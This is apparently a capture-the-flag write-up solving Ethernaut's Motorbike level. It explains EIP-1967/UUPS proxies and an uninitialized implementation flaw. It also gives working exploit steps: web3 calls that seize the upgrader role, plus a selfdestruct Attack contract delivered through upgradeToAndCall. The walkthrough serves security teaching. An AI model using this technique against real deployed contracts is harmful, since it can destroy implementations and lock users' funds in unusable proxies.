<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

Challenge's message:

> Ethernaut's motorbike has a brand new upgradeable engine design. Would you be able to selfdestruct its engine and make the motorbike unusable ?


This set of Solidity contracts demonstrates a simple upgradeability pattern using **EIP-1967**, which enables you to upgrade the logic of a smart contract while maintaining its storage and state. EIP-1967 introduces a proxy contract that delegates calls to an implementation contract. **This allows you to upgrade the implementation without changing the proxy contract's address or the storage layout**.


The `Motorbike` contract is a proxy contract that delegates function calls to its implementation. Here's how it works:

- **Initialization**: The constructor of `Motorbike` takes an address `_logic` as an argument, which represents the initial implementation contract. It checks if `_logic` is a valid contract address using the `Address.isContract()` function from OpenZeppelin. Then, it sets the `_IMPLEMENTATION_SLOT` to the `_logic` address. After that, it attempts to delegate call the `initialize()` function of the `_logic` contract.

 - **Delegation**: The `fallback` function of the `Motorbike` contract is triggered when an unknown function is called on the proxy contract. **It delegates the call to the current implementation by using the address stored in the** `_IMPLEMENTATION_SLOT`.


The `Engine` contract is the implementation contract meant to be used with the `Motorbike` proxy. It inherits from `Initializable`, which is a part of the OpenZeppelin library.

- **Initialization**: The `initialize()` function initializes the contract state. It sets the `horsePower` to 1000 and the `upgrader` to the sender's address.

- **Upgrade and Call**: The `upgradeToAndCall()` function is used to upgrade the implementation of the proxy and execute a function on the new implementation. This function requires the sender to have the `upgrader` role. It calls `_authorizeUpgrade()` to ensure the sender is authorized. Then, it upgrades the implementation using `_upgradeToAndCall()`. If `data` is provided, **it delegates calls to the new implementation with the provided data**.

- **Authorization Check**: The `_authorizeUpgrade()` function restricts the upgrade functionality to the `upgrader` role. If the sender is not the `upgrader`, the upgrade is denied.

- **Implementation Upgrade**: The `_upgradeToAndCall()` function performs the actual implementation upgrade. It sets the new implementation address in the `_IMPLEMENTATION_SLOT` and delegates calls to the new implementation. If `data` is provided, it's used to call a function on the new implementation.

- **Implementation Storage**: The `_setImplementation()` function is responsible for storing the new implementation address in the `_IMPLEMENTATION_SLOT`.


This set of contracts implements a basic upgradeability pattern using EIP-1967, where a proxy contract (`Motorbike`) delegates calls to an implementation contract (`Engine`). The `Engine` contract can be upgraded by an authorized upgrader using the `upgradeToAndCall()` function. This enables the contract's logic to be upgraded while retaining its storage and state.

##	EIP-1967

ERC1967 is a standard for upgradeable smart contracts using **proxy patterns** in the Ethereum ecosystem. The ERC1967 Proxy **allows for the separation of the contract's logic and storage, enabling contract upgrades without disrupting the contract's state or requiring users to interact with a new contract address**.

In the traditional smart contract deployment model, upgrading a contract requires deploying a new contract and migrating the data and functionality from the old contract to the new one. This process can be complex and may require users to update their interactions with the contract.

**With the ERC1967 Proxy, the contract logic is stored in a separate implementation contract, while the proxy contract acts as a transparent intermediary between the user and the implementation contract. The proxy contract delegates function calls to the implementation contract, allowing for seamless upgrades without changing the contract address**.

When an upgrade is needed, a new implementation contract is deployed, and the proxy contract is updated to point to the new implementation. The proxy contract retains the same address, and all interactions with the contract continue to go through the proxy, which then forwards the calls to the new implementation. This upgradeability feature provided by the ERC1967 Proxy is beneficial in scenarios where contracts need to evolve over time, fix bugs, or add new features without disrupting existing users or requiring them to update their interactions.

## Uninitialized UUPS Proxy Implementation

The Initializable contract is a utility contract provided by the OpenZeppelin library that **helps in initializing contract state variables**. It is often used in upgradeable contracts where the state variables need to be initialized during the deployment of a new version of the contract.

The Initializable contract defines a single function called `initialize()`, which is meant to be **called only once immediately after the contract is deployed**. This function is responsible for initializing the state variables of the contract.

By using the Initializable contract, you can separate the initialization logic from the contract's constructor. **This is important because in upgradeable contracts, the constructor is only executed once during the initial deployment, and subsequent upgrades do not trigger the constructor again**. Therefore, any state variables that need to be initialized in subsequent upgrades should be handled by the `initialize()` function instead.


The reason why this process is done immediately in implementation contracts is due to the **poorly structured requirement** found in the `initializer()` function in the `Initializable` contract. If the implementation contract does not initialized quickly, the attacker will call the `initializer()` function. After then, he may skip some requirements or enable to call some functions unauthorized. 

As you can see from the code above, the `initializing` variable has been defined. When you define a bool variable without any assigned value, **it will be the default value which means it will be false**. 

In the requirement, unless called the function, `initializing || isConstructor() || !initialized` condation **always returns true** because of the `initialized` variable's value is false and `!initialized` is true.  

```solidity
bool private initialized;

  /**
   * @dev Indicates that the contract is in the process of being initialized.
   */
  bool private initializing;

  /**
   * @dev Modifier to use in the initializer function of a contract.
   */
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
      initializing = true;
      initialized = true;
    }

    _;

    if (isTopLevelCall) {
      initializing = false;
    }
  }

```

More about this topic, you might check CertiK's article [from here](https://www.certik.com/resources/blog/FnfYrOCsy3MG9s9gixfbJ-upgradeable-proxy-contract-security-best-practices).

# Subverting

In this challenge, Ethernaut wants us to selfdestruct the `Engine` contract. The possible way is to call the `upgradeToAndCall()` function with the attack contract's address and the exploit function's signature. Thus, we can detonate the contract by calling the function using the selfdestruct method in the attack contract with the delegatecall. Remember, **delegatecall uses low-level interaction but impacts to caller's contract**.

However, we need to **be upgrader** to do this plan. To be an upgrader, we must call the `initialize()` function by passing the `initializer` modifier from the `Engine` contract. As we learned from the previous part, there may be some uninitialized functions :) Let's check!


For this reason, we should find the `Engine` contract's address at first. Genarally, **the logic contracts store of the proxy contract's address in the randomize storage slots** with the `_IMPLEMENTATION_SLOT` variable. Also, it says it refers to `eip1967.proxy.implementation` in the command line. So, we must find this proxy's address with the given slot's pointer.

```js
address = await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
'0x000000000000000000000000c886bb58a9ef8f390296cb8ad0529c0f00b13155'
```

For make it clear the address, delete zeros.

```js
address = '0x' + address.slice(-40)
'0xc886bb58a9ef8f390296cb8ad0529c0f00b13155'
```

When we searched this address in the etherscan, we realized that this address belongs to a contract.

<p align="center"><img width="400" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/contract.png"/></p>

Then, in the Remix IDE, we can **check the upgrader's value** thanks to interfaces. It is **not defined**. It shows that **the motorbike didn't call** `initialize()` function. So, we can pass this requirement and be upgrader when we call the `upgradeToAndCall()` function. 

<p align="center"><img height="450" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/upgrader.png"/></p>


After all, we can pass on to the attack contract. Let's see it!


```solidity
pragma solidity ^0.8.20;

interface IEngine{
    function upgrader() external view returns(address);
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function initializer() external;
}

contract Attack {

    function signature() external view returns(bytes memory){
        return abi.encodeWithSignature("attack()");
    }

    function attack() external{
        selfdestruct(payable(address(0)));
    }
}
```

Shortly, the `IEngine` helps us to view `Engine` contract's value. Then, in the signature() function, we get the attack() function's signature for use when send transaction to the contract. Finally, the attack() function will selfdestruct the `Engine` contract. Time to hack!

Deploy the attack contract and **get the signature of our attack() function**. See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0xdd3a50c58686e7327229a23ef87ed7afebe75f905180a96978e2aa58beb52c03).

<p align="center"><img width="250" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/signature.png"/></p>


For being upgrader, send the transaction to the `Engine` contract with the `0x8129fc1c` value which is refers to **keccak-256 signature hash** of `initialize()` function. See the transaction on [etherscan](https://sepolia.etherscan.io/tx/0xed3ec7742edbac93cbd5984fd86a78671c1036a26fe383bdcc7c18f5def4fbb6).

```js
await web3.eth.sendTransaction({from: player,to: address,data: '0x8129fc1c' // initialize()})
```

```js
const _function = {
  "inputs": [
    { 
      "name": "newImplementation",
      "type": "address"
    },
    { 
      "name": "data",
      "type": "bytes"
    }
  ],
  "name": "upgradeToAndCall", 
  "type": "function"
};
const param = [
  '0xAC1BD02388e07e3cC69664EE6A1c31616C5B25E7', // Attack
  '0x9e5faafc', // attack()
];
const data = web3.eth.abi.encodeFunctionCall(_function, param);
await web3.eth.sendTransaction({from: player, to: address,data: data})
```

Now we are upgrader. In the end, send the transaction to call `upgradeToAndCall()` with our attack contract's address and function's signature. See the transation [on etherscan](https://sepolia.etherscan.io/tx/0xb12150f04808b3f9b93c68c1bb93a64b54c5b3bfe27c435322391ccac5d9d27e).

R.I.P. Engine, welcome next level!

Ethernaut's message:

> The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.
This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.
This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.
Takeways: never leave implementation contracts uninitialized ;)


**_by wasny0ps_**
